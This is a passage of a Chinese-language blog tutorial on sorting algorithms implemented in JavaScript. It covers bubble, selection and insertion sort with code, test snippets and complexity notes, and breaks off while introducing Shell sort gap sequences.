title="二、排序算法"></a>二、排序算法</h3><p>这里主要介绍几种简单排序和高级排序：</p><ul><li><strong>简单排序：</strong>冒泡排序、选择排序、插入排序；</li><li><strong>高级排序：</strong>希尔排序、快速排序；</li></ul><p>此处创建一个列表类ArrayList并添加一些属性和方法，用于存放这些排序方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建列表类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ArrayList</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//属性</span></span><br><span class="line">  <span class="built_in">this</span>.array = []</span><br><span class="line"></span><br><span class="line">  <span class="comment">//方法</span></span><br><span class="line">  <span class="comment">//封装将数据插入到数组中方法</span></span><br><span class="line">  ArrayList.prototype.insert = <span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.array.push(item)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//toString方法</span></span><br><span class="line">  ArrayList.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.array.join(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//交换两个位置的数据</span></span><br><span class="line">  ArrayList.prototype.swap = <span class="function"><span class="keyword">function</span>(<span class="params">m, n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> temp  = <span class="built_in">this</span>.array[m]</span><br><span class="line">    <span class="built_in">this</span>.array[m] = <span class="built_in">this</span>.array[n]</span><br><span class="line">    <span class="built_in">this</span>.array[n] = temp</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1.冒泡排序"></a>1.冒泡排序</h4><p><strong>冒泡排序的思路：</strong></p><ul><li>对未排序的各元素<strong>从头到尾</strong>依次比较<strong>相邻的两个元素</strong>大小关系；</li><li>如果<strong>左边的人员高</strong>，则将两人<strong>交换位置</strong>。比如1比2矮，不交换位置；</li><li>向<strong>右移动一位</strong>，继续比较2和3，最后比较 length - 1 和 length - 2这两个数据；</li><li>当到达<strong>最右端</strong>时，<strong>最高的人</strong>一定被放在了<strong>最右边</strong>；</li><li>按照这个思路，从最左端重新开始时，只需要走到<strong>倒数第二个位置</strong>即可；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/2.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/2.png" alt="image-20200304191223265"></a></p><p><strong>实现思路：</strong></p><p>两层循环：</p><ul><li>外层循环控制冒泡趟数：<ul><li>第一次：j = length - 1，比较到倒数第一个位置 ；</li><li>第二次：j = length - 2，比较到倒数第二个位置 ；</li></ul></li><li>内层循环控制每趟比较的次数：<ul><li>第一次比较： i = 0，比较 0 和 1 位置的两个数据；</li><li>最后一次比较：i = length - 2,比较length - 2和 length - 1两个数据；</li></ul></li></ul><p>详细过程如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/3.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/3.png" alt="image-20200304210611689"></a></p><p>动态过程：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/4.gif"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/4.gif" alt="img"></a></p><p><strong>代码实现：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;冒泡排序</span><br><span class="line">ArrayList.prototype.bubblesor &#x3D; function()&#123;</span><br><span class="line">  &#x2F;&#x2F;1.获取数组的长度</span><br><span class="line">  let length &#x3D; this.array.length</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;外层循环控制冒泡趟数</span><br><span class="line">  for(let j &#x3D; length - 1; j &gt;&#x3D; 0; j--)&#123;</span><br><span class="line">    &#x2F;&#x2F;内层循环控制每趟比较的次数</span><br><span class="line">    for(let i &#x3D; 0; i &lt; j; i++)&#123;</span><br><span class="line">    if (this.array[i] &gt; this.array[i+1]) &#123;</span><br><span class="line">      &#x2F;&#x2F;交换两个数据</span><br><span class="line">      let temp  &#x3D; this.array[i]</span><br><span class="line">  this.array[i] &#x3D; this.array[i+1]</span><br><span class="line">  this.array[i+1] &#x3D; temp</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//测试类</span><br><span class="line">let list = new ArrayList()</span><br><span class="line"></span><br><span class="line">//插入元素</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">66</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">88</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">12</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">87</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">100</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">5</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">566</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">//验证冒泡排序</span><br><span class="line">list.bubblesor()</span><br><span class="line">console.<span class="built_in">log</span>(list);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong><br><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/5.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/5.png" alt="image-20200304210433388"></a></p><p><strong>冒泡排序的效率：</strong></p><ul><li>上面所讲的对于7个数据项，比较次数为：6 + 5 + 4 + 3 + 2 + 1;</li><li>对于N个数据项，<strong>比较次数</strong>为：(N - 1) + (N - 2) + (N - 3) + … + 1 = N * (N - 1) / 2；如果两次比较交换一次，那么<strong>交换次数</strong>为：N * (N - 1) / 4；</li><li>使用大O表示法表示比较次数和交换次数分别为：O（ N * (N - 1) / 2）和O（ N * (N - 1) / 4），根据大O表示法的三条规则都化简为：<strong>O（N^2）</strong>;</li></ul><h4 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2.选择排序"></a>2.选择排序</h4><p><strong>选择排序改进了冒泡排序：</strong></p><ul><li>将<strong>交换次数</strong>由<strong>O（N^2）</strong>减小到<strong>O（N）</strong>；</li><li>但是<strong>比较次数</strong>依然是<strong>O（N^2）</strong>；</li></ul><p><strong>选择排序的思路：</strong></p><ul><li>选定<strong>第一个索引的位置</strong>比如1，然后依次和后面的元素<strong>依次进行比较</strong>；</li><li>如果后面的元素，<strong>小于</strong>索引1位置的元素，则<strong>交换位置</strong>到索引1处；</li><li>经过一轮的比较之后，可以确定一开始指定的索引1位置的元素是<strong>最小的</strong>；</li><li>随后使用同样的方法除索引1意外<strong>逐个比较剩下的元素</strong>即可；</li><li>可以看出选择排序，<strong>第一轮</strong>会选出<strong>最小值</strong>，<strong>第二轮</strong>会选出<strong>第二小的值</strong>，直到完成排序。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/6.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/6.png" alt="image-20200304213253241"></a></p><p><strong>实现思路：</strong></p><p>两层循环：</p><ul><li>外层循环控制指定的索引：<ul><li>第一次：j = 0，指定第一个元素 ；</li><li>最后一次：j = length - 1，指定最后一个元素 ；</li></ul></li><li>内层循环负责将指定索引（i）的元素与剩下（i - 1）的元素进行比较；</li></ul><p>动态过程：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/7.gif"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/7.gif" alt="img"></a></p><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//选择排序</span></span><br><span class="line">ArrayList.prototype.selectionSort = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//1.获取数组的长度</span></span><br><span class="line">  <span class="keyword">let</span> length = <span class="built_in">this</span>.array.length</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.外层循环：从0开始获取元素</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; length - <span class="number">1</span>; j++)&#123;</span><br><span class="line">    <span class="keyword">let</span> min = j</span><br><span class="line">    <span class="comment">//内层循环：从i+1位置开始，和后面的元素进行比较</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = min + <span class="number">1</span>; i &lt; length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.array[min] &gt; <span class="built_in">this</span>.array[i]) &#123;</span><br><span class="line">      min = i</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">this</span>.swap(min, j)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//测试类</span><br><span class="line">let list = new ArrayList()</span><br><span class="line"></span><br><span class="line">//插入元素</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">66</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">88</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">12</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">87</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">100</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">5</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">566</span>)</span><br><span class="line">list.<span class="built_in">insert</span>(<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">//验证选择排序</span><br><span class="line">list.selectionSort()</span><br><span class="line">console.<span class="built_in">log</span>(list);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/8.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/8.png" alt="image-20200304222224801"></a></p><p><strong>选择排序的效率：</strong></p><ul><li>选择排序的<strong>比较次数</strong>为：N * (N - 1) / 2，用大O表示法表示为：<strong>O（N^2）</strong>;</li><li>选择排序的<strong>交换次数</strong>为：(N - 1) / 2，用大O表示法表示为：<strong>O（N）</strong>;</li><li>所以选择排序的效率高于冒泡排序；</li></ul><h4 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3.插入排序"></a>3.插入排序</h4><p>插入排序是简单排序中效率<strong>最高</strong>的一种排序。</p><p><strong>插入排序的思路：</strong></p><ul><li>插入排序思想的核心是<strong>局部有序</strong>。如图所示，X左边的人称为<strong>局部有序</strong>；</li><li>首先指定一数据X（从第一个数据开始），并将数据X的左边变成局部有序状态；</li><li>随后将X右移一位，再次达到局部有序之后，继续右移一位，重复前面的操作直至X移至最后一个元素。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/9.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/9.png" alt="image-20200304231400959"></a></p><p>插入排序的详细过程：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/10.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/10.png" alt="image-20200304231643777"></a></p><p>动态过程：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/11.gif"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/11.gif" alt="img"></a></p><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入排序</span></span><br><span class="line">ArrayList.prototype.insertionSort = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//1.获取数组的长度</span></span><br><span class="line">  <span class="keyword">let</span> length = <span class="built_in">this</span>.array.length</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.外层循环:从第二个数据开始，向左边的已经局部有序数据进行插入</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; length; i++)&#123;</span><br><span class="line">    <span class="comment">//3.内层循环：获取i位置的元素，使用while循环(重点)与左边的局部有序数据依次进行比较</span></span><br><span class="line">    <span class="keyword">let</span> temp = <span class="built_in">this</span>.array[i]</span><br><span class="line">    <span class="keyword">let</span> j = i</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">this</span>.array[j - <span class="number">1</span>] &gt; temp &amp;&amp; j &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">this</span>.array[j] = <span class="built_in">this</span>.array[j - <span class="number">1</span>]<span class="comment">//大的数据右移</span></span><br><span class="line">      j--</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//4.while循环结束后，index = j左边的数据变为局部有序且array[j]最大。此时将array[j]重置为排序前的数据array[i]，方便下一次for循环</span></span><br><span class="line">    <span class="built_in">this</span>.array[j] = temp</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//测试类</span><br><span class="line"> let list = new ArrayList()</span><br><span class="line"></span><br><span class="line"> //插入元素</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">66</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">88</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">12</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">87</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">100</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">5</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">566</span>)</span><br><span class="line"> list.<span class="built_in">insert</span>(<span class="number">23</span>)</span><br><span class="line"> // console.<span class="built_in">log</span>(list);</span><br><span class="line"></span><br><span class="line"> //验证插入排序</span><br><span class="line"> list.insertionSort()</span><br><span class="line"> console.<span class="built_in">log</span>(list);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/12.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/12.png" alt="image-20200304235529516"></a></p><p><strong>插入排序的效率：</strong></p><ul><li><strong>比较次数：</strong>第一趟时，需要的最大次数为1；第二次最大为2；以此类推，最后一趟最大为N-1；所以，插入排序的总比较次数为N * (N - 1) / 2；但是，实际上每趟发现插入点之前，平均只有全体数据项的一半需要进行比较，所以比较次数为：<strong>N * (N - 1) / 4</strong>；</li><li><strong>交换次数：</strong>指定第一个数据为X时交换0次，指定第二个数据为X最多需要交换1次，以此类推，指定第N个数据为X时最多需要交换N - 1次，所以一共需要交换N * (N - 1) / 2次，平局次数为<strong>N * (N - 1) / 2</strong>；</li><li>虽然用大O表示法表示插入排序的效率也是<strong>O（N^2）</strong>，但是插入排序整体操作次数更少，因此，在简单排序中，插入排序<strong>效率最高</strong>；</li></ul><h4 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4.希尔排序"></a>4.希尔排序</h4><p><strong>希尔排序</strong>是<strong>插入排序</strong>的一种高效的<strong>改进版</strong>，效率比插入排序要<strong>高</strong>。</p><p><strong>希尔排序的历史背景：</strong></p><ul><li>希尔排序按其设计者希尔（Donald Shell）的名字命名，该算法由<strong>1959年公布</strong>；</li><li>希尔算法首次突破了计算机界一直认为的<strong>算法的时间复杂度都是O（N^2）</strong>的大关，为了纪念该算法里程碑式</li></ul><p>的意义，用<strong>Shell</strong>来命名该算法；</p><p><strong>插入排序的问题：</strong></p><ul><li>假设一个<strong>很小的数据项</strong>在<strong>很靠近右端的位置</strong>上，这里本应该是<strong>较大的数据项的位置</strong>；</li><li>将这个<strong>小数据项移动到左边</strong>的正确位置，所有的<strong>中间数据项都必须向右移动一位</strong>，这样效率非常低；</li><li>如果通过<strong>某种方式</strong>，不需要<strong>一个个移动所有中间的数据项</strong>，就能把较小的数据项移到左边，那么这个算法的执行速度就会有很大的改进。</li></ul><p><strong>希尔排序的实现思路：</strong></p><ul><li>希尔排序主要通过对数据进行<strong>分组</strong>实现快速排序；</li><li>根据设定的增量（gap）将数据分为gap个组（<strong>组数等于gap</strong>），再在每个分组中进行局部排序；</li></ul><blockquote><p>假如有数组有10个数据，第1个数据为黑色，增量为5。那么第二个为黑色的数据index=5，第3个数据为黑色的数据index = 10（不存在）。所以黑色的数据每组只有2个，10 / 2 = 5一共可分5组，即<strong>组数等于增量gap</strong>。</p></blockquote><ul><li>排序之后，减小增量，继续分组，再次进行局部排序，直到增量gap=1为止。随后只需进行微调就可完成数组的排序；</li></ul><p>具体过程如下：</p><ul><li>排序之前的，储存10个数据的原始数组为：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/13.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/13.png" alt="image-20200305102330304"></a></p><ul><li>设初始增量gap = length / 2 = 5，即数组被分为了5组，如图所示分别为：[8, 3]、[9, 5]、[1, 4]、[7, 6]、[2, 0]：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/14.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/14.png" alt="image-20200305104914438"></a></p><ul><li>随后分别在每组中对数据进行局部排序，5组的顺序如图所示，变为：[3, 8]、[5, 9]、[1, 4]、[6, 7]、[0, 2]：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/15.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/15.png" alt="image-20200305103136251"></a></p><ul><li>然后缩小增量gap = 5 / 2 = 2，即数组被分为了2组，如图所示分别为：[3，1，0，9，7]、[5，6，8，4，2]：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/16.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/16.png" alt="image-20200305104933858"></a></p><ul><li>随后分别在每组中对数据进行局部排序，两组的顺序如图所示，变为：[0，1，3，7，9]、[2，4，5，6，8]：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/17.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/17.png" alt="image-20200305103815262"></a></p><ul><li>然后然后缩小增量gap = 2 / 1 = 1，即数组被分为了1组，如图所示为：[0，2，1，4，3，5，7，6，9，8]：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/18.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/18.png" alt="image-20200305104847458"></a></p><ul><li>最后只需要对该组数据进行插入排序即可完成整个数组的排序：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/19.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/19.png" alt="image-20200305104707789"></a></p><p>动态过程：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/20.gif"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/20.gif" alt="img"></a></p><p>图中d表示增量gap。</p><p><strong>增量的选择：</strong></p><ul><li><strong>原稿</strong>中希尔建议的初始间距为<strong>N / 2</strong>，比如对于N = 100的数组，增量序列为：50，25，12，6，3，1，可以发现不能整除时向下取整。</li><li><strong>Hibbard增量序列：</strong>增量序列算法为：2^k - 1，即1，3，5，7… …等；这种情况的最坏复杂度为*<em>O（N3/2）*</em>,平均复杂度为**O（N5/4）**但未被证明；</li><li><strong>Sedgewcik增量序列：</strong></li></ul><p><a 